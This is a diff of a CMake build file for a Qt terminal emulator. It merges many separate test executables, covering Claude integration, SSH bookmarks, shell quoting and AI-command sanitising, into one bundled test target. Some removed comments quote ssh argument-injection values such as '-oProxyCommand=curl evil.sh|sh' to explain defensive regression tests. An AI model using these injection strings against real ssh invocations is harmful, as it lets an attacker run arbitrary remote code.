@@ -445,11 +445,18 @@ if(ANTS_TESTS)
     # GUI bundle helper — bundles share PCH from ants-terminal so the per-TU
     # Qt cost only pays once across the whole tests-on build. The Qt6::Widgets
     # link surface comes through transitively from each ants_*_lib (PUBLIC).
+    #
+    # The internal ants_*_lib graph has cycles (chrome ↔ claude ↔ dialogs
+    # via mainwindow.cpp's calls into all three). GNU ld scans archives
+    # left-to-right and won't revisit, so wrap the bundle's static libs in
+    # `--start-group/--end-group` so the linker keeps re-scanning until
+    # all symbols resolve. Cheap on archive count this small (≤ 7).
     function(ants_add_gui_bundle name)
         cmake_parse_arguments(B "" "" "LIBS;SOURCES" ${ARGN})
         add_executable(${name} tests/bundle_main_gui.cpp ${B_SOURCES})
         target_link_libraries(${name} PRIVATE
-            ${B_LIBS} ants_warnings GTest::gtest)
+            -Wl,--start-group ${B_LIBS} -Wl,--end-group
+            ants_warnings GTest::gtest)
         target_precompile_headers(${name} REUSE_FROM ants-terminal)
         gtest_discover_tests(${name}
             DISCOVERY_MODE PRE_TEST
@@ -474,213 +481,6 @@ if(ANTS_TESTS)
         LABELS "audit;fast"
         TIMEOUT 30)
 
-    # claude_status_bar — asserts the Claude Code status-bar contract:
-    # transcript → ClaudeState mapping covers every documented last-event
-    # variant, setShellPid clears stale state on tab-switch, and
-    # contextUpdated fires with the right percent derived from
-    # usage.input_tokens. See tests/features/claude_status_bar/spec.md.
-    # Needs Qt6::Network because ClaudeIntegration's MCP server hooks pull
-    # in QLocalSocket/QLocalServer which chain through Network.
-    add_executable(test_claude_status_bar
-        tests/features/claude_status_bar/test_claude_status.cpp
-        src/claudeintegration.cpp
-    )
-    target_link_libraries(test_claude_status_bar PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Network
-        Qt6::Test
-    )
-    target_include_directories(test_claude_status_bar PRIVATE src)
-    target_compile_options(test_claude_status_bar PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME claude_status_bar COMMAND test_claude_status_bar)
-    set_tests_properties(claude_status_bar PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_status_bar_per_tab — ANTS-1161 regression. The hook server
-    # is one UDS shared by every Claude under any tab, so a sibling
-    # tab's PreToolUse used to clobber the singleton's m_state and
-    # paint that tab's tool name on the focused tab's bottom Claude:
-    # <state> widget. The gate in processHookEvent now drops events
-    # whose session_id doesn't match m_transcriptPath's basename. See
-    # tests/features/claude_status_bar_per_tab/spec.md.
-    add_executable(test_claude_status_bar_per_tab
-        tests/features/claude_status_bar_per_tab/test_claude_status_bar_per_tab.cpp
-        src/claudeintegration.cpp
-    )
-    target_link_libraries(test_claude_status_bar_per_tab PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Network
-        Qt6::Test
-    )
-    target_include_directories(test_claude_status_bar_per_tab PRIVATE src)
-    target_compile_options(test_claude_status_bar_per_tab PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME claude_status_bar_per_tab COMMAND test_claude_status_bar_per_tab)
-    set_tests_properties(claude_status_bar_per_tab PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_plan_mode_detection — asserts that plan-mode toggle events
-    # in the JSONL transcript are correctly read (field is `permissionMode`,
-    # not `mode`) and that planModeChanged(bool) fires on transition.
-    # Anchored to the real Claude Code v2.1.87 JSONL schema. See
-    # tests/features/claude_plan_mode_detection/spec.md.
-    add_executable(test_claude_plan_mode
-        tests/features/claude_plan_mode_detection/test_claude_plan_mode.cpp
-        src/claudeintegration.cpp
-    )
-    target_link_libraries(test_claude_plan_mode PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Network
-        Qt6::Test
-    )
-    target_include_directories(test_claude_plan_mode PRIVATE src)
-    target_compile_options(test_claude_plan_mode PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME claude_plan_mode_detection COMMAND test_claude_plan_mode)
-    set_tests_properties(claude_plan_mode_detection PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_tab_status_indicator — asserts that the per-tab Claude
-    # activity tracker keeps independent state for N shells, that
-    # awaitingInput flags override the transcript-derived state without
-    # clobbering it, and that plan-mode latching works on the real
-    # tracker (not just the shared parser helper). See
-    # tests/features/claude_tab_status_indicator/spec.md.
-    add_executable(test_claude_tab_tracker
-        tests/features/claude_tab_status_indicator/test_claude_tab_tracker.cpp
-        src/claudeintegration.cpp
-        src/claudetabtracker.cpp
-    )
-    target_link_libraries(test_claude_tab_tracker PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Network
-        Qt6::Test
-    )
-    target_include_directories(test_claude_tab_tracker PRIVATE src)
-    target_compile_options(test_claude_tab_tracker PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_claude_tab_tracker PRIVATE
-        ANTS_SOURCE_DIR="${CMAKE_SOURCE_DIR}"
-    )
-    add_test(NAME claude_tab_status_indicator COMMAND test_claude_tab_tracker)
-    set_tests_properties(claude_tab_status_indicator PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_transcript_robustness — asserts that (INV-1/2) the JSONL
-    # tail-window reader grows past events larger than 32 KB without
-    # dropping state and returns within the 4 MiB cap on pathological
-    # inputs, and that (INV-3..6) decodeProjectPath filesystem-probes to
-    # preserve hyphens in leaf and intermediate path segments while
-    # keeping legacy hyphen-free paths unchanged. See
-    # tests/features/claude_transcript_robustness/spec.md.
-    add_executable(test_claude_transcript_robustness
-        tests/features/claude_transcript_robustness/test_claude_transcript_robustness.cpp
-        src/claudeintegration.cpp
-    )
-    target_link_libraries(test_claude_transcript_robustness PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Network
-        Qt6::Test
-    )
-    target_include_directories(test_claude_transcript_robustness PRIVATE src)
-    target_compile_options(test_claude_transcript_robustness PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME claude_transcript_robustness
-             COMMAND test_claude_transcript_robustness)
-    set_tests_properties(claude_transcript_robustness PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # allowlist_add — asserts (A) rule normalisation, (B) generalisation
-    # across every shell splitter, (C) segment-aware subsumption,
-    # (D) hook-path button retraction wiring (toolFinished +
-    # sessionStopped on ClaudeIntegration, not only
-    # claudePermissionCleared on TerminalWidget), (E)
-    # openClaudeAllowlistDialog calls show+raise+activateWindow so the
-    # dialog becomes the active window on a frameless parent.
-    # See tests/features/allowlist_add/spec.md.
-    #
-    # §D and §E production bindings grep src/mainwindow.cpp at runtime
-    # — SRC_MAINWINDOW_PATH baked in as a compile definition below.
-    # §E also does an API-level QDialog+QMainWindow lifecycle check,
-    # which needs QApplication + offscreen QPA.
-    add_executable(test_allowlist_add
-        tests/features/allowlist_add/test_allowlist_add.cpp
-        src/claudeallowlist.cpp
-        src/debuglog.cpp  # 0.7.12: allowlist logs parse-failure guard via ANTS_LOG
-    )
-    target_link_libraries(test_allowlist_add PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Widgets
-    )
-    target_include_directories(test_allowlist_add PRIVATE src)
-    target_compile_options(test_allowlist_add PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_allowlist_add PRIVATE
-        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
-        SRC_CLAUDESTATUSWIDGETS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
-    )
-    add_test(NAME allowlist_add COMMAND test_allowlist_add)
-    set_tests_properties(allowlist_add PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10
-        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")
-
-    # allowlist_perms_postcommit — asserts Claude allowlist settings file
-    # lands 0600 after saveSettings(), covering the QSaveFile-rename edge
-    # case on filesystems that don't preserve fd perms across rename
-    # (FAT/exFAT, some SMB/NFS servers, Qt copy+unlink fallback).
-    # Locks the belt-and-suspenders post-commit setOwnerOnlyPerms call
-    # on m_settingsPath in saveSettings(). See
-    # tests/features/allowlist_perms_postcommit/spec.md.
-    add_executable(test_allowlist_perms_postcommit
-        tests/features/allowlist_perms_postcommit/test_allowlist_perms_postcommit.cpp
-        src/claudeallowlist.cpp
-        src/debuglog.cpp
-    )
-    target_link_libraries(test_allowlist_perms_postcommit PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Widgets
-    )
-    target_include_directories(test_allowlist_perms_postcommit PRIVATE src)
-    target_compile_options(test_allowlist_perms_postcommit PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_allowlist_perms_postcommit PRIVATE
-        SRC_CLAUDEALLOWLIST_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
-    )
-    add_test(NAME allowlist_perms_postcommit
-             COMMAND test_allowlist_perms_postcommit)
-    set_tests_properties(allowlist_perms_postcommit PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10
-        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")
-
-    # session_persistence_default — locks in the 0.6.43 fix that flipped
-    # Config::sessionPersistence()'s default from false → true. Pre-fix,
-    # fresh users (no `session_persistence` key in config.json) silently
-    # had tabs discarded on exit. Exercises Config's public API directly
-    # against an isolated XDG_CONFIG_HOME, asserting the full truth table
-    # {missing, false, true} → {true, false, true}. See
-    # tests/features/session_persistence_default/spec.md.
     add_executable(test_session_persistence_default
         tests/features/session_persistence_default/test_session_persistence_default.cpp
         src/config.cpp
@@ -699,126 +499,6 @@ if(ANTS_TESTS)
         LABELS "features;fast"
         TIMEOUT 10)
 
-    # ssh_dash_host_rejected — regression guard for the 0.7.7 CVE-2017-
-    # 1000117-class fix. SshBookmark::toSshCommand must emit `--` before
-    # the host argument, so OpenSSH will never parse a host value that
-    # begins with `-` as an option (e.g. -oProxyCommand=bash -c 'evil').
-    # Shell-quoting alone does not defend against this — the shell passes
-    # the value correctly but ssh itself re-parses the leading dash.
-    add_executable(test_ssh_dash_host_rejected
-        tests/features/ssh_dash_host_rejected/test_ssh_dash.cpp
-        src/sshdialog.cpp
-    )
-    target_link_libraries(test_ssh_dash_host_rejected PRIVATE
-        Qt6::Core
-        Qt6::Widgets
-    )
-    target_include_directories(test_ssh_dash_host_rejected PRIVATE src)
-    target_compile_options(test_ssh_dash_host_rejected PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME ssh_dash_host_rejected COMMAND test_ssh_dash_host_rejected)
-    set_tests_properties(ssh_dash_host_rejected PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # ssh_extra_args_sanitize — asserts the 0.7.12 /indie-review fix that
-    # rejects ProxyCommand/LocalCommand/PermitLocalCommand from extraArgs.
-    # Without this filter a bookmark field carrying
-    # `-oProxyCommand=curl evil.sh|sh` hands OpenSSH an attacker-chosen
-    # shell command (executed via /bin/sh -c). See
-    # tests/features/ssh_extra_args_sanitize/spec.md.
-    add_executable(test_ssh_extra_args_sanitize
-        tests/features/ssh_extra_args_sanitize/test_ssh_extra_args.cpp
-        src/sshdialog.cpp
-    )
-    target_link_libraries(test_ssh_extra_args_sanitize PRIVATE
-        Qt6::Core
-        Qt6::Widgets
-    )
-    target_include_directories(test_ssh_extra_args_sanitize PRIVATE src)
-    target_compile_options(test_ssh_extra_args_sanitize PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME ssh_extra_args_sanitize COMMAND test_ssh_extra_args_sanitize)
-    set_tests_properties(ssh_extra_args_sanitize PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # shellutils_whitelist — asserts the 0.7.57 /indie-review fix
-    # (ANTS-1047) that switched shellQuote from a denylist regex to a
-    # whitelist. Pre-fix, glob/redirection/bracket characters slipped
-    # through unquoted; the test feeds each of the previously-missed
-    # classes plus the existing happy path. See
-    # tests/features/shellutils_whitelist/spec.md.
-    add_executable(test_shellutils_whitelist
-        tests/features/shellutils_whitelist/test_shellutils_whitelist.cpp
-    )
-    target_link_libraries(test_shellutils_whitelist PRIVATE Qt6::Core)
-    target_include_directories(test_shellutils_whitelist PRIVATE src)
-    target_compile_options(test_shellutils_whitelist PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME shellutils_whitelist COMMAND test_shellutils_whitelist)
-    set_tests_properties(shellutils_whitelist PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # ai_insert_command_sanitize — asserts the 0.7.12 /indie-review
-    # OWASP LLM01+LLM02 fix: AI-suggested commands pass through
-    # control-char strip + 4 KiB cap, AND the click handler gates the
-    # insertCommand emit on a user confirmation dialog. See
-    # tests/features/ai_insert_command_sanitize/spec.md.
-    add_executable(test_ai_insert_command_sanitize
-        tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp
-        src/aidialog.cpp
-    )
-    target_link_libraries(test_ai_insert_command_sanitize PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Widgets
-        Qt6::Network
-    )
-    target_include_directories(test_ai_insert_command_sanitize PRIVATE src)
-    target_compile_options(test_ai_insert_command_sanitize PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_ai_insert_command_sanitize PRIVATE
-        SRC_AI_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
-    )
-    add_test(NAME ai_insert_command_sanitize COMMAND test_ai_insert_command_sanitize)
-    set_tests_properties(ai_insert_command_sanitize PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_git_context_hook — installer source-grep test for the
-    # UserPromptSubmit git-context hook. Asserts SettingsDialog's new
-    # installClaudeGitContextHook writes the canonical script, targets
-    # UserPromptSubmit in ~/.claude/settings.json, preserves existing
-    # entries, refuses to clobber a corrupt settings file, and wires a
-    # dedicated UI button. See tests/features/claude_git_context_hook/spec.md.
-    add_executable(test_claude_git_context_installer
-        tests/features/claude_git_context_hook/test_installer_grep.cpp
-    )
-    target_compile_options(test_claude_git_context_installer PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_claude_git_context_installer PRIVATE
-        SRC_SETTINGSDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
-        SRC_SETTINGSDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
-        SRC_CONFIGPATHS_H="${CMAKE_CURRENT_SOURCE_DIR}/src/configpaths.h"
-    )
-    add_test(NAME claude_git_context_installer
-             COMMAND test_claude_git_context_installer)
-    set_tests_properties(claude_git_context_installer PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_git_context_script — behavioral test of the bash script the
-    # installer writes. Extracts the script body from settingsdialog.cpp
-    # (single source of truth) and exercises it across five scenarios:
-    # not-a-repo, git-missing, clean repo, dirty repo (1/1/1 counts),
-    # CLAUDE_PROJECT_DIR override.
     add_test(NAME claude_git_context_script
              COMMAND bash "${CMAKE_CURRENT_SOURCE_DIR}/tests/features/claude_git_context_hook/test_script.sh")
     set_tests_properties(claude_git_context_script PROPERTIES
@@ -826,39 +506,6 @@ if(ANTS_TESTS)
         TIMEOUT 30
         ENVIRONMENT "SRC_SETTINGSDIALOG_CPP=${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp")
 
-    # ai_context_redaction — OWASP LLM06 defense. Asserts the 14 secret
-    # shapes in src/secretredact.h redact with the correct [REDACTED:<kind>]
-    # label, negative controls (UUID, commit SHA, plain URLs, prose) pass
-    # through verbatim, priority ordering puts sk-ant-… before legacy
-    # sk-…, and AiDialog::sendRequest wires scrub() to both the terminal
-    # context and the user message before either reaches the JSON body.
-    # See tests/features/ai_context_redaction/spec.md.
-    add_executable(test_ai_context_redaction
-        tests/features/ai_context_redaction/test_ai_context_redaction.cpp
-    )
-    target_link_libraries(test_ai_context_redaction PRIVATE
-        Qt6::Core
-    )
-    target_include_directories(test_ai_context_redaction PRIVATE src)
-    target_compile_options(test_ai_context_redaction PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_ai_context_redaction PRIVATE
-        SRC_AIDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
-    )
-    add_test(NAME ai_context_redaction COMMAND test_ai_context_redaction)
-    set_tests_properties(ai_context_redaction PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # image_bomb_png_header_peek — regression guard for the 0.7.7 fix that
-    # added QImageReader-based dimension peeks before QImage::loadFromData
-    # on inline-image byte streams (OSC 1337 iTerm2 + Kitty APC PNG path).
-    # Without the peek, a 1 KB compressed PNG declaring 100 000 × 100 000
-    # forces a multi-GB decode allocation before the post-decode
-    # MAX_IMAGE_DIM guard fires. Static source inspection — a runtime
-    # image-bomb test would either succeed (no signal) or hang the test
-    # process (no signal either), neither useful in CI.
     add_executable(test_image_bomb_png_header_peek
         tests/features/image_bomb_png_header_peek/test_image_bomb.cpp
     )
@@ -875,40 +522,6 @@ if(ANTS_TESTS)
         LABELS "features;fast"
         TIMEOUT 10)
 
-    # ssh_control_master — locks the SSH ControlMaster auto-multiplexing
-    # contract on SshBookmark::toSshCommand(bool). When controlMaster=true,
-    # the built command must carry -o ControlMaster=auto / -o ControlPath=
-    # <resolved $HOME>/.ssh/cm-%r@%h:%p / -o ControlPersist=10m, placed
-    # before the [user@]host destination. The default call
-    # (controlMaster=false) must be byte-identical to the pre-0.7.1
-    # legacy command so existing bookmarks keep working.
-    # See tests/features/ssh_control_master/spec.md.
-    add_executable(test_ssh_control_master
-        tests/features/ssh_control_master/test_ssh_control_master.cpp
-        src/sshdialog.cpp
-    )
-    target_link_libraries(test_ssh_control_master PRIVATE
-        Qt6::Core
-        Qt6::Gui
-        Qt6::Widgets  # sshdialog.h transitively includes QDialog
-    )
-    target_include_directories(test_ssh_control_master PRIVATE src)
-    target_compile_options(test_ssh_control_master PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    set_target_properties(test_ssh_control_master PROPERTIES
-        AUTOMOC ON)
-    add_test(NAME ssh_control_master
-             COMMAND test_ssh_control_master)
-    set_tests_properties(ssh_control_master PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # threaded_ptywrite_gating — locks the 0.6.35 regression fix. Asserts
-    # no `if (m_pty)` / `&& m_pty)` gate on any ptyWrite() call site in
-    # TerminalWidget — m_pty is null on the worker path, so a bare-
-    # pointer gate silently drops every write, which is exactly how the
-    # keystroke-not-echoing bug shipped in 0.6.34.
     add_executable(test_threaded_ptywrite_gating
         tests/features/threaded_ptywrite_gating/test_threaded_ptywrite_gating.cpp
     )
@@ -1342,160 +955,6 @@ if(ANTS_TESTS)
         LABELS "features;fast"
         TIMEOUT 10)
 
-    # claude_bg_tasks_button — 0.7.38 feature. Background-tasks
-    # status-bar button + live-tail dialog for Claude Code's
-    # `run_in_background:true` Bash/Task launches. User request
-    # 2026-04-25. Locks the parser shape (run_in_background +
-    # backgroundTaskId), the tracker's QFileSystemWatcher + signal,
-    # the button's hide-when-empty contract, the wire-up to the
-    # showBgTasksDialog click handler, and the dialog's reuse of the
-    # 0.7.37 scroll-preservation pattern. See spec.md.
-    add_executable(test_claude_bg_tasks_button
-        tests/features/claude_bg_tasks_button/test_claude_bg_tasks_button.cpp
-    )
-    target_compile_options(test_claude_bg_tasks_button PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_claude_bg_tasks_button PRIVATE
-        SRC_BGTASKS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasks.cpp"
-        SRC_BGTASKS_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasks.h"
-        SRC_BGDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasksdialog.cpp"
-        SRC_BGDIALOG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasksdialog.h"
-        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
-        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
-        SRC_CLAUDE_INTEGRATION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeintegration.cpp"
-        SRC_CLAUDE_INTEGRATION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeintegration.h"
-        SRC_CLAUDESTATUSWIDGETS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
-    )
-    add_test(NAME claude_bg_tasks_button
-        COMMAND test_claude_bg_tasks_button)
-    set_tests_properties(claude_bg_tasks_button PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_state_dot_palette — 0.7.39 feature. User request
-    # 2026-04-27: a single round dot per tab in a state-specific
-    # colour, with grey for Idle, and the same palette extended to
-    # the bottom status-bar Claude label. Locks the unified helper,
-    # the eight-state palette, the uniform dot geometry (no outline,
-    # no per-state radius), the helper-driven status-bar applier, and
-    # the Auditing plumbing through ClaudeTabTracker::ShellState. See
-    # tests/features/claude_state_dot_palette/spec.md.
-    add_executable(test_claude_state_dot_palette
-        tests/features/claude_state_dot_palette/test_claude_state_dot_palette.cpp
-    )
-    target_compile_options(test_claude_state_dot_palette PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_claude_state_dot_palette PRIVATE
-        COLOREDTABBAR_H="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.h"
-        COLOREDTABBAR_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.cpp"
-        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
-        CLAUDETABTRACKER_H="${CMAKE_CURRENT_SOURCE_DIR}/src/claudetabtracker.h"
-        CLAUDESTATUSWIDGETS_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
-    )
-    add_test(NAME claude_state_dot_palette
-        COMMAND test_claude_state_dot_palette)
-    set_tests_properties(claude_state_dot_palette PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_statusbar_extraction — ANTS-1146 (0.7.74). Locks the
-    # ClaudeStatusBarController extraction invariants — class
-    # declaration shape, public-API + signal byte-for-byte
-    # signatures, user-visible labels preserved in the new TU,
-    # migrated members no longer referenced in mainwindow.cpp,
-    # setup function rename, exactly six controller-connect sites,
-    # two-sided LoC anchor. Source-grep only; no Qt link. See
-    # tests/features/claude_statusbar_extraction/spec.md and
-    # docs/specs/ANTS-1146.md.
-    add_executable(test_claude_statusbar_extraction
-        tests/features/claude_statusbar_extraction/test_claude_statusbar_extraction.cpp
-    )
-    target_compile_options(test_claude_statusbar_extraction PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    target_compile_definitions(test_claude_statusbar_extraction PRIVATE
-        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
-        SRC_MAINWINDOW_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
-        SRC_CLAUDESTATUSWIDGETS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
-        SRC_CLAUDESTATUSWIDGETS_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.h"
-        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
-    )
-    add_test(NAME claude_statusbar_extraction
-        COMMAND test_claude_statusbar_extraction)
-    set_tests_properties(claude_statusbar_extraction PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_task_list — ANTS-1158. User request 2026-05-02:
-    # status-bar widget + dialog showing the focused tab's Claude
-    # Code task list (TodoWrite snapshot OR TaskCreate / TaskUpdate
-    # replay) with status. Hybrid harness — links claudetasklist.cpp
-    # for parser-behaviour INVs (1-8); source-greps the wiring sites
-    # for INVs 9-13. See tests/features/claude_task_list/spec.md and
-    # docs/specs/ANTS-1158.md.
-    add_executable(test_claude_task_list
-        tests/features/claude_task_list/test_claude_task_list.cpp
-        src/claudetasklist.cpp
-    )
-    target_link_libraries(test_claude_task_list PRIVATE
-        Qt6::Core
-        Qt6::Test
-    )
-    target_include_directories(test_claude_task_list PRIVATE src)
-    target_compile_options(test_claude_task_list PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME claude_task_list
-        COMMAND test_claude_task_list
-        WORKING_DIRECTORY ${CMAKE_SOURCE_DIR})
-    set_tests_properties(claude_task_list PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # claude_session_freshness — ANTS-1163. User report 2026-05-07:
-    # Task List dialog shows tasks from the previous Claude Code
-    # session after a fresh launch (reboot + new claude). Root cause:
-    # ClaudeIntegration::sessionPathForCwd picks newest .jsonl by
-    # mtime alone; a prior session's transcript outranks the new
-    # session's empty transcript until the first event lands.
-    # Fix: process-start anchored filter + 24h liveness floor.
-    # See tests/features/claude_session_freshness/spec.md.
-    add_executable(test_claude_session_freshness
-        tests/features/claude_session_freshness/test_claude_session_freshness.cpp
-        src/claudeintegration.cpp
-    )
-    target_link_libraries(test_claude_session_freshness PRIVATE
-        Qt6::Core
-        Qt6::Network
-        Qt6::Test
-    )
-    target_include_directories(test_claude_session_freshness PRIVATE src)
-    target_compile_definitions(test_claude_session_freshness PRIVATE
-        SRC_CLAUDE_INTEGRATION_CPP_PATH="${CMAKE_SOURCE_DIR}/src/claudeintegration.cpp"
-    )
-    target_compile_options(test_claude_session_freshness PRIVATE
-        -Wall -Wextra -Wpedantic
-    )
-    add_test(NAME claude_session_freshness
-        COMMAND test_claude_session_freshness
-        WORKING_DIRECTORY ${CMAKE_SOURCE_DIR})
-    set_tests_properties(claude_session_freshness PROPERTIES
-        LABELS "features;fast"
-        TIMEOUT 10)
-
-    # roadmap_viewer — 0.7.39 feature. User request 2026-04-27:
-    # status-bar Roadmap button visible iff the active tab's cwd
-    # contains a ROADMAP.md (case-insensitive); click opens a
-    # filterable dialog with five peer category checkboxes (Done /
-    # Planned / In progress / Considered / Currently being tackled).
-    # Current-work bullets get a yellow left-border highlight derived
-    # from CHANGELOG [Unreleased] + recent git commit subjects. The
-    # test is a hybrid source-grep + behavioral harness — links the
-    # roadmapdialog.cpp source so the static renderHtml helper can be
-    # called against synthetic markdown to verify filter semantics
-    # and the highlight CSS marker. See spec.md.
     add_executable(test_roadmap_viewer
         tests/features/roadmap_viewer/test_roadmap_viewer.cpp
         src/roadmapdialog.cpp
@@ -2494,4 +1953,64 @@ if(ANTS_TESTS)
         SRC_DIR="${CMAKE_SOURCE_DIR}/src"
         VTSTREAM_H="${CMAKE_SOURCE_DIR}/src/vtstream.h"
         VTSTREAM_CPP="${CMAKE_SOURCE_DIR}/src/vtstream.cpp")
+
+    # ANTS-1217 Phase 4: Claude integration + allowlist + AI + SSH +
+    # shell-utils tests. Bundle pulls in claude_lib (its primary subject)
+    # plus chrome+dialogs+vt+core because (a) several tests grep
+    # mainwindow.cpp, (b) sshdialog/aidialog live in dialogs_lib,
+    # (c) chrome_lib requires its claude/dialogs/audit cross-refs to
+    # link, just like test_chrome.
+    ants_add_gui_bundle(test_claude
+        LIBS    ants_chrome_lib ants_vt_lib ants_core_lib
+                ants_claude_lib ants_dialogs_lib ants_audit_lib
+                $<$<BOOL:${LUA_FOUND}>:ants_lua_lib>
+        SOURCES tests/features/claude_status_bar/test_claude_status.cpp
+                tests/features/claude_status_bar_per_tab/test_claude_status_bar_per_tab.cpp
+                tests/features/claude_plan_mode_detection/test_claude_plan_mode.cpp
+                tests/features/claude_tab_status_indicator/test_claude_tab_tracker.cpp
+                tests/features/claude_transcript_robustness/test_claude_transcript_robustness.cpp
+                tests/features/allowlist_add/test_allowlist_add.cpp
+                tests/features/allowlist_perms_postcommit/test_allowlist_perms_postcommit.cpp
+                tests/features/ssh_dash_host_rejected/test_ssh_dash.cpp
+                tests/features/ssh_extra_args_sanitize/test_ssh_extra_args.cpp
+                tests/features/shellutils_whitelist/test_shellutils_whitelist.cpp
+                tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp
+                tests/features/claude_git_context_hook/test_installer_grep.cpp
+                tests/features/ai_context_redaction/test_ai_context_redaction.cpp
+                tests/features/ssh_control_master/test_ssh_control_master.cpp
+                tests/features/claude_bg_tasks_button/test_claude_bg_tasks_button.cpp
+                tests/features/claude_state_dot_palette/test_claude_state_dot_palette.cpp
+                tests/features/claude_statusbar_extraction/test_claude_statusbar_extraction.cpp
+                tests/features/claude_task_list/test_claude_task_list.cpp
+                tests/features/claude_session_freshness/test_claude_session_freshness.cpp)
+    # claude_status_bar et al. use QSignalSpy (Qt6::Test); also pulls
+    # Qt6::Network for ClaudeIntegration's QLocalSocket/QLocalServer
+    # MCP-server hooks.
+    target_link_libraries(test_claude PRIVATE Qt6::Test Qt6::Network)
+    target_compile_definitions(test_claude PRIVATE
+        ANTS_SOURCE_DIR="${CMAKE_SOURCE_DIR}"
+        SRC_MAINWINDOW_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
+        SRC_MAINWINDOW_CPP_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.cpp"
+        SRC_MAINWINDOW_H_PATH="${CMAKE_SOURCE_DIR}/src/mainwindow.h"
